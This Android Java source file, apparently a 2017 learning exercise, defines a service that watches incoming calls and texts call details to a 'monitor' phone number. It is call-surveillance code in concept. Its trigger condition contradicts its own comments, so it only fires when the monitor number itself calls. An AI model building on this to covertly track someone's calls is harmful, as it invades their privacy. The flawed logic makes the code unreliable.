package com.example.sharkj.fromphonelistener;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import java.net.URLEncoder;

/**
 * Created by sharkj on 2017/11/30.
 */

public class FPLService extends Service {
    //    当执行完startservice(it)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(FPLService.this, "程序流程已经进入到Service类中...", Toast.LENGTH_LONG).show();
//        补充：获得it携带过来的监控者手机号码
        Bundle bundle = intent.getBundleExtra("rongqi");
        final String phoneNumber = bundle.getString("phonenum");
        Toast.makeText(FPLService.this, "监控者手机号码 = " + phoneNumber, Toast.LENGTH_LONG).show();
        //完成来电监控功能的开启以及监控操作
        PhoneStateListener psl = new PhoneStateListener() {
            //当检测到电话状态发生改变的时候，会自动调用执行方法
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                //当电话响铃的时候，且来电号码是第三方号码，进行监控操作
                //补充判断：监控者手机是否为短号
                String listenerNum = phoneNumber;
                if (listenerNum.length() == 4) {
                    listenerNum = "1555521" + phoneNumber;
                }
                if (state == TelephonyManager.CALL_STATE_RINGING && (incomingNumber.equals(listenerNum))) {
                    //                    监控操作-->发送来电号码给监控者手机，也就是发送短信操作
//                    获得短信管理器对象
                    SmsManager smsManager = SmsManager.getDefault();
//                    准备短信内容（去向号码+去信内容）
                    String message = incomingNumber + "is Called Phone to Ta";
//                    发送短信
                    smsManager.sendTextMessage(listenerNum, null, message, null, null);
                }
            }
        };
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
//        开启操作
        tm.listen(psl, PhoneStateListener.LISTEN_CALL_STATE);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}